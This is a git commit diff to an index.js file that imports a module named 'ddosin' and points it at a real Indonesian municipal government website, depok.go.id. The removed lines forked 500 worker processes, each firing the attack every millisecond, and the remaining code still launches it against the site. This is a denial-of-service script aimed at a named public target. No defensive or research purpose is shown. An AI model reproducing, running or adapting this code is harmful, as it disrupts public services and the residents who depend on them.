c2300807304790b934b4f45f9910f441ade4cba1
IputuIndrawan <134178063+IputuIndrawan@users.noreply.github.com>
2024-05-08 21:24:46 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,14 +1,2 @@
 let ddosin = require("./lol.js")
-const cluster = require('cluster');
-
-function attack(){
 ddosin(`https://depok.go.id/`)
-}
-
-if (cluster.isMaster) {
-  for (let i = 0; i < 500; i++) {
-    cluster.fork();
-  }
-} else {
-  setInterval(attack, 1);
-}
